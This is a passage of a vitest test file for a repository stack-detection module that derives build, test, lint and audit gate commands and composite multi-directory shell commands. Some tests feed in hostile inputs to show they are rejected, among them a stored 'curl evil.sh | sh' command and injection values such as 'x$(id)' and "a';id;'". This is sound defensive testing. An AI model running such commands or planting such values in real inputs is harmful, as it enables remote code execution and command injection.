import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  COMPONENT_MARKER_RE,
  componentMarker,
  compositeCommand,
  compositeComponentCount,
  compositeSharedStack,
  detectedGateDefaults,
  detectedStacks,
  detectedTarget,
  detectedTargetDir,
  detectStack,
  inDir,
  PYTEST_NO_TESTS_STATUS,
  YARN_GATE_DEFAULTS,
} from './stackDetection.js';

describe('detectStack', () => {
  it('detects nothing for an empty repo', () => {
    expect(detectStack([])).toEqual({
      evidence: [],
      primary: null,
      stacks: [],
      suggestedDockerfile: null,
      suggestedGateCommands: {},
    });
  });

  it('detects node and suggests only the scripts package.json declares', () => {
    const r = detectStack(['package.json', 'src/index.ts'], {
      packageJsonScripts: ['lint', 'test', 'typecheck'],
    });
    expect(r.stacks).toEqual(['node']);
    expect(r.primary).toBe('node');
    expect(r.suggestedDockerfile).toBe('node');
    expect(r.suggestedGateCommands).toEqual({
      runLint: 'npm run lint',
      runTests: 'npm test',
      runTypecheck: 'npm run typecheck',
    });
    expect(r.evidence).toEqual(['package.json']);
  });

  it('suggests no node commands for scripts the package.json does not declare', () => {
    const r = detectStack(['package.json'], { packageJsonScripts: ['build'] });
    expect(r.suggestedGateCommands).toEqual({});
    // Without scripts info at all, nothing is guessed.
    expect(detectStack(['package.json']).suggestedGateCommands).toEqual({});
  });

  it.each([
    ['yarn.lock', { runLint: 'yarn lint', runTests: 'yarn test', runTypecheck: 'yarn typecheck' }],
    [
      'pnpm-lock.yaml',
      { runLint: 'pnpm lint', runTests: 'pnpm test', runTypecheck: 'pnpm typecheck' },
    ],
    [
      'package-lock.json',
      { runLint: 'npm run lint', runTests: 'npm test', runTypecheck: 'npm run typecheck' },
    ],
  ])('uses the %s package manager for node commands', (lockfile, commands) => {
    const r = detectStack(['package.json', lockfile], {
      packageJsonScripts: ['lint', 'test', 'typecheck'],
    });
    expect(r.suggestedGateCommands).toEqual(commands);
    expect(r.evidence).toEqual(['package.json', lockfile]);
  });

  it('detects python conservatively from requirements.txt', () => {
    const r = detectStack(['requirements.txt']);
    expect(r).toMatchObject({
      primary: 'python',
      stacks: ['python'],
      suggestedDockerfile: 'python',
      suggestedGateCommands: { runTests: 'python -m pytest' },
    });
  });

  it('suggests ruff for a pyproject python repo', () => {
    const r = detectStack(['pyproject.toml']);
    expect(r.suggestedGateCommands).toEqual({
      runLint: 'ruff check',
      runTests: 'python -m pytest',
    });
  });

  it('detects jvm from pom.xml', () => {
    const r = detectStack(['pom.xml']);
    expect(r.suggestedGateCommands).toEqual({
      runBuild: 'mvn -B -q -DskipTests package',
      runTests: 'mvn -B -ntp test',
    });
    expect(r.suggestedDockerfile).toBe('jvm');
  });

  it('detects jvm from a gradle build file', () => {
    for (const file of ['build.gradle', 'build.gradle.kts']) {
      const r = detectStack([file]);
      expect(r.stacks).toEqual(['jvm']);
      expect(r.suggestedGateCommands).toEqual({
        runBuild: './gradlew build -x test --no-daemon',
        runTests: './gradlew test --no-daemon',
      });
    }
  });

  it('detects go with no curated image', () => {
    const r = detectStack(['go.mod']);
    expect(r).toMatchObject({
      primary: 'go',
      stacks: ['go'],
      suggestedDockerfile: 'go',
      suggestedGateCommands: {
        runBuild: 'go build ./...',
        runLint: 'go vet ./...',
        runTests: 'go test ./...',
      },
    });
  });

  it('lists every stack of a polyglot repo and applies the node-first precedence', () => {
    const r = detectStack(['go.mod', 'package.json', 'pyproject.toml', 'pom.xml']);
    expect(r.stacks).toEqual(['node', 'python', 'jvm', 'go']);
    expect(r.primary).toBe('node');
    expect(r.suggestedDockerfile).toBe('node');
    expect(r.evidence).toEqual(['package.json', 'pyproject.toml', 'pom.xml', 'go.mod']);
  });

  it('picks python over jvm when node is absent', () => {
    const r = detectStack(['pom.xml', 'setup.py']);
    expect(r.stacks).toEqual(['python', 'jvm']);
    expect(r.primary).toBe('python');
  });
});

describe('detectedGateDefaults', () => {
  const detect = (files: string[]) => detectStack(files);

  it('is null where the built-in gates apply: nothing, a Node root on Yarn or unknown, no stack', () => {
    expect(detectedGateDefaults(null)).toBeNull();
    expect(detectedGateDefaults(undefined)).toBeNull();
    expect(detectedGateDefaults(detect([]))).toBeNull();
    expect(detectedGateDefaults(detect(['package.json']))).toBeNull();
    expect(detectedGateDefaults(detect(['package.json', 'yarn.lock']))).toBeNull();
    // A detection stored before the manager was recorded.
    expect(
      detectedGateDefaults({ components: [{ path: '', stacks: ['node'] }], evidence: [] })
    ).toBeNull();
    // Node outranks Python at a polyglot root, so the Node gates stay.
    expect(detectedGateDefaults(detect(['package.json', 'pyproject.toml']))).toBeNull();
    expect(
      detectedGateDefaults({ components: [{ path: '', stacks: ['node'] }], packageManager: 'bun' })
    ).toBeNull();
    // More components than a composite covers, and no root signal, is a layout with no single
    // right place, which is not the same as "nothing detected": no commands, not the built-ins.
    expect(
      detectedGateDefaults(detect(Array.from({ length: 9 }, (_, i) => `s${i}/go.mod`)))
    ).toEqual({});
  });

  it('gives each non-Node root its own commands, and no gate it has no command for', () => {
    expect(detectedGateDefaults(detect(['requirements.txt']))).toEqual({
      runTests: 'python -m pytest',
    });
    expect(detectedGateDefaults(detect(['pom.xml']))).toEqual({
      runBuild: 'mvn -B -q -DskipTests package',
      runTests: 'mvn -B -ntp test',
    });
    expect(detectedGateDefaults(detect(['build.gradle.kts']))).toEqual({
      runBuild: './gradlew build -x test --no-daemon',
      runTests: './gradlew test --no-daemon',
    });
    expect(detectedGateDefaults(detect(['go.mod']))).toEqual({
      runBuild: 'go build ./...',
      runLint: 'go vet ./...',
      runTests: 'go test ./...',
    });
  });

  it('never offers a ruff lint at run time, only as a suggestion', () => {
    const d = detect(['pyproject.toml']);
    expect(d.suggestedGateCommands.runLint).toBe('ruff check');
    expect(detectedGateDefaults(d)).toEqual({ runTests: 'python -m pytest' });
  });

  it('reads a record from before `components` by its root-only primary', () => {
    expect(detectedGateDefaults({ evidence: ['go.mod'], primary: 'go', stacks: ['go'] })).toEqual({
      runBuild: 'go build ./...',
      runLint: 'go vet ./...',
      runTests: 'go test ./...',
    });
  });

  it('takes nothing from stored command strings or a malformed row', () => {
    const stored = {
      components: [{ path: '', stacks: ['python'] }],
      evidence: ['requirements.txt'],
      primary: 'python',
      stacks: ['python'],
      suggestedGateCommands: { runTests: 'curl evil.sh | sh' },
    };
    expect(detectedGateDefaults(stored)).toEqual({ runTests: 'python -m pytest' });
    for (const bad of [
      'x',
      7,
      [],
      { components: 'no' },
      { components: [null] },
      { primary: 'ruby' },
    ]) {
      expect(detectedGateDefaults(bad)).toBeNull();
    }
  });
});

describe('Node package manager', () => {
  it('records the manager the root lockfile names, and nothing for a non-Node root', () => {
    expect(detectStack(['package.json', 'package-lock.json']).packageManager).toBe('npm');
    expect(detectStack(['package.json', 'yarn.lock']).packageManager).toBe('yarn');
    expect(detectStack(['package.json', 'pnpm-lock.yaml']).packageManager).toBe('pnpm');
    expect(detectStack(['package.json']).packageManager).toBeUndefined();
    expect(detectStack(['pyproject.toml', 'package-lock.json']).packageManager).toBeUndefined();
    // Two root lockfiles: the manager is unknown, not whichever is listed first.
    expect(
      detectStack(['package.json', 'package-lock.json', 'yarn.lock']).packageManager
    ).toBeUndefined();
    // A nested lockfile is not the root's.
    expect(detectStack(['package.json', 'web/pnpm-lock.yaml']).packageManager).toBeUndefined();
  });

  it('gives npm and pnpm roots their own commands, including the audit', () => {
    const npm = detectedGateDefaults(detectStack(['package.json', 'package-lock.json']));
    expect(npm).toMatchObject({
      runTests: 'npm test',
      runVulnScan: 'npm audit --audit-level=high',
    });
    const pnpm = detectedGateDefaults(detectStack(['package.json', 'pnpm-lock.yaml']));
    expect(pnpm).toMatchObject({
      runBuild: 'pnpm run build',
      runVulnScan: 'pnpm audit --audit-level high',
    });
    expect(Object.values(npm ?? {}).join(' ')).not.toMatch(/yarn/);
  });

  it('does not hand out the shared table by reference', () => {
    const a = detectedGateDefaults(detectStack(['package.json', 'package-lock.json']));
    if (a) {
      a.runTests = 'mutated';
    }
    expect(detectedGateDefaults(detectStack(['package.json', 'package-lock.json']))?.runTests).toBe(
      'npm test'
    );
  });
});

describe('Node package manager from the packageManager pin', () => {
  const pkg = (packageManager: string) => JSON.stringify({ name: 'x', packageManager });
  const withPin = (files: string[], packageManager?: string) =>
    detectStack(files, packageManager ? { packageJson: pkg(packageManager) } : undefined);

  it('names the manager from the pin, which outranks a lockfile', () => {
    expect(withPin(['package.json', 'package-lock.json'], 'pnpm@10.34.7').packageManager).toBe(
      'pnpm'
    );
    expect(withPin(['package.json', 'yarn.lock'], 'npm@11.1.0').packageManager).toBe('npm');
    // No lockfile at all: the pin is the only evidence.
    expect(withPin(['package.json'], 'pnpm@10.34.7+sha512.abc').packageManager).toBe('pnpm');
  });

  it('keeps packageManager an enum, never the raw field', () => {
    const d = withPin(['package.json'], 'pnpm@10.34.7+sha512.abcdef');
    expect(d.packageManager).toBe('pnpm');
    expect(JSON.stringify(d)).not.toContain('sha512');
    expect(detectedGateDefaults(d)).toMatchObject({ runTests: 'pnpm test' });
  });

  it('tells Yarn Classic from Berry by the pin, else by .yarnrc.yml, else leaves it unknown', () => {
    expect(withPin(['package.json', 'yarn.lock'], 'yarn@1.22.22')).toMatchObject({
      packageManager: 'yarn',
      yarnFlavor: 'classic',
    });
    expect(withPin(['package.json', 'yarn.lock'], 'yarn@4.18.1')).toMatchObject({
      packageManager: 'yarn',
      yarnFlavor: 'berry',
    });
    expect(withPin(['package.json', 'yarn.lock', '.yarnrc.yml'])).toMatchObject({
      packageManager: 'yarn',
      yarnFlavor: 'berry',
    });
    const unknown = withPin(['package.json', 'yarn.lock']);
    expect(unknown.packageManager).toBe('yarn');
    expect(unknown.yarnFlavor).toBeUndefined();
    // A pin outranks the config file: Corepack would run what the pin says.
    expect(withPin(['package.json', 'yarn.lock', '.yarnrc.yml'], 'yarn@1.22.22').yarnFlavor).toBe(
      'classic'
    );
  });

  it('ignores a pin it cannot read, and falls back to the lockfile', () => {
    for (const bad of ['bun@1.2.0', 'yarn', '', 'pnpm@', 'npm@latest', '$(id)@1']) {
      expect(withPin(['package.json', 'package-lock.json'], bad).packageManager, bad).toBe('npm');
    }
    expect(
      detectStack(['package.json', 'package-lock.json'], { packageJson: 'not json' }).packageManager
    ).toBe('npm');
  });

  it('gives Yarn Classic the built-in gates but no audit, which Yarn 1 could only send to a public host', () => {
    const classic = detectedGateDefaults(withPin(['package.json', 'yarn.lock'], 'yarn@1.22.22'));
    expect(classic).toEqual({
      runBuild: YARN_GATE_DEFAULTS.runBuild,
      runLint: YARN_GATE_DEFAULTS.runLint,
      runTests: YARN_GATE_DEFAULTS.runTests,
      runTypecheck: YARN_GATE_DEFAULTS.runTypecheck,
    });
    expect(classic).not.toHaveProperty('runVulnScan');
    // Berry's `yarn npm audit` is the built-in, and stays Berry's.
    expect(YARN_GATE_DEFAULTS.runVulnScan).toBe('yarn npm audit --severity high');
  });

  it('leaves Yarn Berry and an unknown Yarn on the built-in gates, as before', () => {
    expect(detectedGateDefaults(withPin(['package.json', 'yarn.lock'], 'yarn@4.18.1'))).toBeNull();
    expect(detectedGateDefaults(withPin(['package.json', 'yarn.lock']))).toBeNull();
    expect(detectedGateDefaults(withPin(['package.json']))).toBeNull();
  });

  it('reads scripts from the package.json text for the suggestions', () => {
    const d = detectStack(['package.json', 'package-lock.json'], {
      packageJson: JSON.stringify({ scripts: { lint: 'x', test: 'y' } }),
    });
    expect(d.suggestedGateCommands).toEqual({ runLint: 'npm run lint', runTests: 'npm test' });
  });
});

describe('components as the target', () => {
  const D = (files: string[], opts?: Parameters<typeof detectStack>[1]) => detectStack(files, opts);

  it('uses the root when it has a signal, and the one component when it has none', () => {
    expect(detectedTarget(D(['go.mod', 'svc/pom.xml']))).toMatchObject({ dir: '', stack: 'go' });
    expect(detectedTarget(D(['svc/api/pom.xml']))).toMatchObject({ dir: 'svc/api', stack: 'jvm' });
    expect(detectedTargetDir(D(['svc/api/pom.xml']))).toBe('svc/api');
    expect(detectedTargetDir(D(['go.mod']))).toBe('');
  });

  it('runs the stack defaults in the component, and only the defaults', () => {
    const d = D(['backend/pom.xml']);
    expect(detectedGateDefaults(d)).toEqual({
      runBuild: "cd 'backend' && mvn -B -q -DskipTests package",
      runTests: "cd 'backend' && mvn -B -ntp test",
    });
    // The JVM build tool is the component's, not the root's.
    expect(detectedGateDefaults(D(['backend/build.gradle']))?.runTests).toBe(
      "cd 'backend' && ./gradlew test --no-daemon"
    );
    expect(inDir('', 'go test ./...')).toBe('go test ./...');
  });

  it('gives a Node component its own lockfile’s manager, and Yarn commands when it has none', () => {
    expect(detectedGateDefaults(D(['web/package.json', 'web/pnpm-lock.yaml']))?.runTests).toBe(
      "cd 'web' && pnpm test"
    );
    expect(
      detectedGateDefaults(D(['web/package.json', 'web/package-lock.json']))?.runVulnScan
    ).toBe("cd 'web' && npm audit --audit-level=high");
    // No lockfile in the directory: npm's commands, which work without one (Yarn 4 would refuse).
    expect(detectedGateDefaults(D(['web/package.json']))?.runTests).toBe("cd 'web' && npm test");
    expect(detectedGateDefaults(D(['web/package.json']))?.runBuild).toBe(
      "cd 'web' && npm run build"
    );
    expect(detectedGateDefaults(D(['web/package.json', 'web/yarn.lock']))?.runVulnScan).toBe(
      "cd 'web' && yarn npm audit --severity high"
    );
    expect(
      detectedGateDefaults(D(['web/package.json', 'web/yarn.lock', 'web/.yarnrc.yml']))?.runTests
    ).toBe("cd 'web' && yarn test");
    // A lockfile at the root, where there is no package.json, is not the component's.
    expect(detectedGateDefaults(D(['web/package.json', 'pnpm-lock.yaml']))?.runTests).toBe(
      "cd 'web' && npm test"
    );
  });

  it('stays ambiguous, with no single directory, when several components compete', () => {
    const d = D(['api/pom.xml', 'web/package.json']);
    expect(detectedTarget(d)).toBe('ambiguous');
    expect(detectedTargetDir(d)).toBe('');
    // A composite has no image either: it is not one place.
    expect(detectedTarget(D(['a/go.mod', 'b/go.mod']))).toBe('ambiguous');
  });

  it('counts only directories with a stack signal toward the cap, so a big tree still resolves', () => {
    // 120 directories of docs and one service: none of the docs is a component, so the listing is
    // complete as far as stacks go. (The cap used to count every directory, which both dropped the
    // service from `components` and switched this rule off.)
    const docs = Array.from({ length: 120 }, (_, i) => `docs/d${i}/page.md`);
    const d = D(['README.md', 'backend/pom.xml', ...docs]);
    expect(d.componentsTruncated).toBeUndefined();
    expect(d.components).toEqual([{ path: 'backend', stacks: ['jvm'] }]);
    expect(detectedGateDefaults(d)?.runTests).toBe("cd 'backend' && mvn -B -ntp test");
    // A signal directory sorted behind them is still found.
    const late = D([...docs, 'zz/go.mod']);
    expect(late.components).toEqual([{ path: 'zz', stacks: ['go'] }]);
  });

  it('treats a Gradle settings file as the JVM root, not a subproject as the target', () => {
    const d = D(['settings.gradle.kts', 'gradlew', 'app/build.gradle.kts']);
    expect(detectedTarget(d)).toMatchObject({ dir: '', stack: 'jvm' });
    expect(detectedGateDefaults(d)?.runTests).toBe('./gradlew test --no-daemon');
    expect(detectedGateDefaults(D(['settings.gradle', 'app/pom.xml']))?.runBuild).toBe(
      './gradlew build -x test --no-daemon'
    );
  });

  it('treats a JVM project below another as that parent’s, so a nested build is one component', () => {
    const gradle = D([
      'server/settings.gradle.kts',
      'server/gradlew',
      'server/app/build.gradle.kts',
    ]);
    expect(gradle.components).toEqual([{ path: 'server', stacks: ['jvm'] }]);
    expect(detectedGateDefaults(gradle)?.runTests).toBe(
      "cd 'server' && ./gradlew test --no-daemon"
    );
    const maven = D(['svc/pom.xml', 'svc/core/pom.xml', 'svc/web/pom.xml']);
    expect(maven.components).toEqual([{ path: 'svc', stacks: ['jvm'] }]);
    expect(detectedGateDefaults(maven)?.runTests).toBe("cd 'svc' && mvn -B -ntp test");
    // Not a tree: sibling JVM projects, and a JVM project beside a Node one, are still several.
    expect(detectedTarget(D(['a/pom.xml', 'b/pom.xml']))).toBe('ambiguous');
    expect(detectedTarget(D(['a/pom.xml', 'b/package.json']))).toBe('ambiguous');
    // A JVM directory keeps its other stacks.
    expect(D(['svc/pom.xml', 'svc/ui/package.json']).components).toEqual([
      { path: 'svc', stacks: ['jvm'] },
      { path: 'svc/ui', stacks: ['node'] },
    ]);
  });

  it('gives a component with two lockfiles the built-in Yarn commands, not a guessed manager', () => {
    const both = D(['web/package.json', 'web/yarn.lock', 'web/package-lock.json']);
    expect(detectedGateDefaults(both)?.runTests).toBe("cd 'web' && yarn test");
    // No lockfile at all is a different case: npm.
    expect(detectedGateDefaults(D(['web/package.json']))?.runTests).toBe("cd 'web' && npm test");
  });

  it('does not guess from an incomplete listing', () => {
    const files = ['svc/pom.xml'];
    expect(detectedTarget(D(files, { treeTruncated: true }))).toBeNull();
    expect(detectedGateDefaults(D(files, { treeTruncated: true }))).toBeNull();
    const many = Array.from({ length: 60 }, (_, i) => `s${i}/go.mod`);
    expect(detectedTarget(D(many))).toBeNull();
    // With a root signal the listing's completeness does not matter.
    expect(detectedTarget(D(['go.mod', ...files], { treeTruncated: true }))).toMatchObject({
      dir: '',
    });
  });

  it('treats a stored path as untrusted', () => {
    const stored = (path: string) => ({
      components: [{ path, stacks: ['go'] }],
      evidence: [],
    });
    for (const bad of [
      '../x',
      '/abs',
      '-rf',
      'a b',
      "a';id;'",
      'a/../b',
      'a//b',
      '.',
      '..',
      'a/b/c/d/e',
      'x$(id)',
      'a\nb',
      '',
    ]) {
      if (bad === '') {
        continue; // '' is the root, handled elsewhere
      }
      expect(detectedTarget(stored(bad)), bad).toBeNull();
      expect(detectedGateDefaults(stored(bad)), bad).toBeNull();
    }
    expect(detectedTarget(stored('services/api-v2/go_svc'))).toMatchObject({
      dir: 'services/api-v2/go_svc',
    });
  });

  it('survives a malformed row', () => {
    for (const bad of [
      { components: 'x' },
      { components: [null, 7, 'a'] },
      { components: [{ path: 3, stacks: ['go'] }] },
      { components: [{ path: 'a', stacks: 'go' }] },
      { components: [{ path: 'a', stacks: ['ruby'] }] },
      { evidence: 'x', primary: 'go' },
    ]) {
      expect(() => detectedGateDefaults(bad), JSON.stringify(bad)).not.toThrow();
    }
    expect(detectedTarget({ components: [{ path: 'a', stacks: ['ruby'] }] })).toBeNull();
    // Legacy: before `components` existed, `primary` was the root's.
    expect(detectedTarget({ evidence: ['go.mod'], primary: 'go' })).toMatchObject({
      dir: '',
      stack: 'go',
    });
  });
});

describe('composite gates for several components', () => {
  const D = (files: string[], opts?: Parameters<typeof detectStack>[1]) => detectStack(files, opts);
  const goDirs = (n: number) => Array.from({ length: n }, (_, i) => `s${i}/go.mod`);

  const cmd = (...parts: Array<[string, string]>) =>
    compositeCommand(parts.map(([dir, command]) => ({ command, dir })));

  it('builds one command per gate, running each component in a subshell cd under a marker', () => {
    const d = D(['a/go.mod', 'b/go.mod']);
    expect(detectedTarget(d)).toBe('ambiguous');
    expect(detectedGateDefaults(d)).toEqual({
      runBuild: cmd(['a', 'go build ./...'], ['b', 'go build ./...']),
      runLint: cmd(['a', 'go vet ./...'], ['b', 'go vet ./...']),
      runTests: cmd(['a', 'go test ./...'], ['b', 'go test ./...']),
    });
  });

  it('generates the documented shape', () => {
    expect(cmd(['a', 'go test ./...'], ['b', 'go test ./...'])).toBe(
      'rc=0; ur=0; ck() { if [ "$1" -ne 0 ]; then if [ "$1" -eq 126 ] || [ "$1" -eq 127 ] || [ "$1" -eq 5 ]; then ur=$1; elif [ "$rc" -eq 0 ]; then rc=$1; fi; fi; }; ' +
        "echo; echo '== auto-swe component: a =='; (cd 'a' && go test ./...) 2>&1; ck $?; " +
        "echo; echo '== auto-swe component: b =='; (cd 'b' && go test ./...) 2>&1; ck $?; " +
        'if [ "$rc" -ne 0 ]; then exit $rc; fi; exit $ur'
    );
  });

  it('leaves a gate absent when any component has no command for it', () => {
    // Python has only runTests, so the build and lint gates are not run in just the Go half.
    expect(detectedGateDefaults(D(['api/go.mod', 'ml/pyproject.toml']))).toEqual({
      runTests: cmd(['api', 'go test ./...'], ['ml', 'python -m pytest']),
    });
    expect(detectedGateDefaults(D(['api/go.mod', 'web/package.json']))).not.toHaveProperty(
      'runVulnScan'
    );
  });

  it('orders components by path whatever order they are stored in', () => {
    const stored = {
      components: [
        { path: 'b', stacks: ['go'] },
        { path: 'a', stacks: ['go'] },
      ],
      evidence: [],
    };
    expect(detectedGateDefaults(stored)?.runTests).toBe(
      cmd(['a', 'go test ./...'], ['b', 'go test ./...'])
    );
  });

  it('gives each Node component its own lockfile’s manager', () => {
    const d = D([
      'admin/package.json',
      'admin/package-lock.json',
      'web/package.json',
      'web/pnpm-lock.yaml',
    ]);
    expect(detectedGateDefaults(d)?.runTests).toBe(
      cmd(['admin', 'npm test'], ['web', 'pnpm test'])
    );
    expect(detectedGateDefaults(d)?.runVulnScan).toBe(
      cmd(['admin', 'npm audit --audit-level=high'], ['web', 'pnpm audit --audit-level high'])
    );
  });

  it('picks the JVM build tool per component', () => {
    expect(detectedGateDefaults(D(['a/pom.xml', 'b/build.gradle']))?.runTests).toBe(
      cmd(['a', 'mvn -B -ntp test'], ['b', './gradlew test --no-daemon'])
    );
  });

  it('covers up to 8 components and none beyond', () => {
    expect(compositeComponentCount(detectedGateDefaults(D(goDirs(8)))?.runTests ?? '')).toBe(8);
    expect(compositeComponentCount('npm test')).toBe(0);
    expect(detectedGateDefaults(D(goDirs(9)))).toEqual({});
    expect(detectedTarget(D(goDirs(9)))).toBe('ambiguous');
  });

  it('returns nothing for a stored component path that does not validate', () => {
    const stored = (bad: string) => ({
      components: [
        { path: 'a', stacks: ['go'] },
        { path: bad, stacks: ['go'] },
      ],
      evidence: [],
    });
    for (const bad of ['../x', '/abs', "b';id;'", 'a b', 'x$(id)']) {
      expect(detectedTarget(stored(bad)), bad).toBe('ambiguous');
      expect(detectedGateDefaults(stored(bad)), bad).toEqual({});
    }
    // A component with no known stack cannot run anything either.
    expect(
      detectedGateDefaults({
        components: [
          { path: 'a', stacks: ['go'] },
          { path: 'b', stacks: ['ruby'] },
        ],
        evidence: [],
      })
    ).toEqual({});
  });

  it('does not guess from an incomplete listing', () => {
    expect(detectedGateDefaults(D(['a/go.mod', 'b/go.mod'], { treeTruncated: true }))).toBeNull();
    expect(detectedGateDefaults(D(goDirs(60)))).toBeNull();
  });

  it('is not used when the root has a signal', () => {
    expect(detectedGateDefaults(D(['go.mod', 'a/go.mod', 'b/go.mod']))?.runTests).toBe(
      'go test ./...'
    );
  });
});

describe('compositeCommand run in a real sh', () => {
  const run = (parts: Array<{ dir: string; command: string }>, wrap = false) => {
    const root = mkdtempSync(join(tmpdir(), 'composite-'));
    for (const dir of ['a', 'a/sub', 'b', 'c']) {
      mkdirSync(join(root, dir), { recursive: true });
    }
    const command = compositeCommand(parts);
    const result = spawnSync('sh', ['-c', wrap ? `{ ${command}\n} 2>&1` : command], {
      cwd: root,
      encoding: 'utf8',
    });
    return { root, status: result.status, stdout: result.stdout };
  };
  const ran = (root: string, dir: string) => existsSync(join(root, dir, 'ran'));
  const touch = (dir: string) => ({ command: 'touch ran', dir });
  const exits = (dir: string, code: number) => ({ command: `exit ${code}`, dir });
  // Each marker follows a bare newline, which ends a previous part's unterminated last line.
  const markers = (...dirs: string[]) => dirs.map((d) => `\n${componentMarker(d)}\n`).join('');

  it('exits 0 when every component passes, and prints a marker before each', () => {
    const r = run([touch('a'), touch('b')]);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe(markers('a', 'b'));
    expect(ran(r.root, 'a') && ran(r.root, 'b')).toBe(true);
  });

  it('uses a marker a runner would not print, matched by the exported pattern', () => {
    expect(componentMarker('a')).toBe('== auto-swe component: a ==');
    expect([...markers('a', 'b').matchAll(COMPONENT_MARKER_RE)].map((m) => m[1])).toEqual([
      'a',
      'b',
    ]);
    expect([...'== a ==\n'.matchAll(COMPONENT_MARKER_RE)]).toHaveLength(0);
  });

  it('fails when the first fails, and still runs the second', () => {
    const r = run([{ command: 'touch ran && exit 3', dir: 'a' }, touch('b')]);
    expect(r.status).toBe(3);
    expect(ran(r.root, 'a')).toBe(true);
    expect(ran(r.root, 'b')).toBe(true);
    expect(r.stdout).toBe(markers('a', 'b'));
  });

  it('lets a real failure outrank a part that is not runnable, in either order', () => {
    expect(run([exits('a', 127), exits('b', 3)]).status).toBe(3);
    expect(run([exits('a', 3), exits('b', 127)]).status).toBe(3);
    expect(run([exits('a', 126), touch('b'), exits('c', 4)]).status).toBe(4);
  });

  it('reports the first real failure when several fail', () => {
    expect(run([exits('a', 3), exits('b', 4)]).status).toBe(3);
    expect(run([touch('a'), exits('b', 4), exits('c', 3)]).status).toBe(4);
  });

  it('treats pytest’s exit 5 (collected nothing) like 126 and 127, so it cannot hide a real failure', () => {
    // A Python component with no tests before a Go component whose tests fail: the loop must keep
    // going on the failure, not stop on "no tests found" (which #558's rule does for exit 5).
    expect(run([exits('a', 5), exits('b', 1)]).status).toBe(1);
    expect(run([exits('a', 1), exits('b', 5)]).status).toBe(1);
    expect(run([exits('a', 5), touch('b')]).status).toBe(PYTEST_NO_TESTS_STATUS);
    expect(run([exits('a', 127), exits('b', 5)]).status).toBe(5);
    expect(run([exits('a', 5), exits('b', 127)]).status).toBe(127);
  });

  it('reports the last 126 or 127 when nothing really failed', () => {
    expect(run([exits('a', 127), exits('b', 127)]).status).toBe(127);
    expect(run([exits('a', 126), exits('b', 127)]).status).toBe(127);
    expect(run([exits('a', 127), exits('b', 126)]).status).toBe(126);
    expect(run([exits('a', 127), touch('b')]).status).toBe(127);
  });

  it('fails when only the last or a middle component fails', () => {
    expect(run([touch('a'), touch('b'), { command: 'false', dir: 'c' }]).status).toBe(1);
    const middle = run([touch('a'), { command: 'false', dir: 'b' }, touch('c')]);
    expect(middle.status).toBe(1);
    expect(ran(middle.root, 'c')).toBe(true);
  });

  it('fails a component whose directory is missing as a real failure, and carries on', () => {
    const r = run([{ command: 'true', dir: 'missing' }, touch('b')]);
    // The shell's own status for a failed `cd` (1 or 2, by shell) — what matters is that it is
    // neither 0 nor an unrunnable status.
    expect(r.status).not.toBe(0);
    expect([126, 127]).not.toContain(r.status);
    expect(ran(r.root, 'b')).toBe(true);
    // ...and it outranks a later 127.
    expect([126, 127]).not.toContain(
      run([{ command: 'true', dir: 'missing' }, exits('b', 127)]).status
    );
  });

  it('does not let one component’s cd move the next one’s starting point', () => {
    const r = run([
      { command: 'cd sub && touch ran', dir: 'a' },
      { command: 'pwd > where && touch ran', dir: 'b' },
    ]);
    expect(r.status).toBe(0);
    expect(existsSync(join(r.root, 'a', 'sub', 'ran'))).toBe(true);
    expect(readFileSync(join(r.root, 'b', 'where'), 'utf8').trim()).toMatch(/\/b$/);
    expect(ran(r.root, 'b')).toBe(true);
  });

  it('keeps every marker a line of its own when a part ends its output without a newline', () => {
    const noNewline = (dir: string) => ({ command: "printf '12 passed'", dir });
    const r = run([noNewline('a'), noNewline('b')]);
    expect(r.status).toBe(0);
    // Both sections are found, so each is judged on its own evidence.
    expect([...r.stdout.matchAll(COMPONENT_MARKER_RE)].map((m) => m[1])).toEqual(['a', 'b']);
    expect(r.stdout).toContain('12 passed\n');
  });

  it('carries a component’s stderr on stdout, under its marker, for a gate that shows one stream', () => {
    const r = run([
      { command: 'echo from-a-stderr >&2', dir: 'a' },
      { command: 'echo from-b-stderr >&2; exit 4', dir: 'b' },
    ]);
    expect(r.status).toBe(4);
    expect(r.stdout).toContain(`${componentMarker('b')}\nfrom-b-stderr`);
    expect(r.stdout).toContain(`${componentMarker('a')}\nfrom-a-stderr`);
  });

  it('works inside a braced group with stderr merged, as the gate runner wraps it', () => {
    expect(run([touch('a')], true).status).toBe(0);
    const bad = run([{ command: 'echo oops >&2; exit 2', dir: 'a' }, exits('b', 127)], true);
    expect(bad.status).toBe(2);
    expect(bad.stdout).toBe(`${markers('a')}oops\n${markers('b')}`);
    expect(run([exits('a', 127), exits('b', 3)], true).status).toBe(3);
  });
});

describe('compositeSharedStack', () => {
  const D = (files: string[]) => detectStack(files);
  const goDirs = (n: number) => Array.from({ length: n }, (_, i) => `s${i}/go.mod`);

  it('names the stack that every component of a composite layout shares', () => {
    expect(compositeSharedStack(D(['a/go.mod', 'b/go.mod']))).toBe('go');
    expect(compositeSharedStack(D(['a/pyproject.toml', 'b/requirements.txt']))).toBe('python');
    expect(compositeSharedStack(D(goDirs(8)))).toBe('go');
  });

  it('is null for mixed stacks, Node, too many components, and non-composite layouts', () => {
    expect(compositeSharedStack(D(['a/go.mod', 'b/pyproject.toml']))).toBeNull();
    expect(compositeSharedStack(D(['a/package.json', 'b/package.json']))).toBeNull();
    expect(compositeSharedStack(D(['a/go.mod', 'b/package.json']))).toBeNull();
    expect(compositeSharedStack(D(goDirs(9)))).toBeNull();
    expect(compositeSharedStack(D(['a/go.mod']))).toBeNull();
    expect(compositeSharedStack(D(['go.mod', 'a/go.mod', 'b/go.mod']))).toBeNull();
    expect(compositeSharedStack(null)).toBeNull();
  });
});

describe('detectedStacks', () => {
  it('is the union of the stacks of every component', () => {
    const stacks = detectedStacks({
      components: [
        { path: '', stacks: ['node'] },
        { path: 'svc', stacks: ['go', 'python'] },
        { path: 'tools', stacks: ['go'] },
      ],
    });
    expect([...(stacks ?? [])].sort()).toEqual(['go', 'node', 'python']);
    expect(detectedStacks(detectStack(['a/go.mod', 'b/package.json']))?.sort()).toEqual([
      'go',
      'node',
    ]);
  });

  it('reads a record from before components existed by its primary', () => {
    expect(detectedStacks({ primary: 'go' })).toEqual(['go']);
    expect(detectedStacks({ primary: 'ruby' })).toBeNull();
  });

  it('is null when the detection is absent or unusable', () => {
    for (const bad of [
      null,
      undefined,
      'x',
      7,
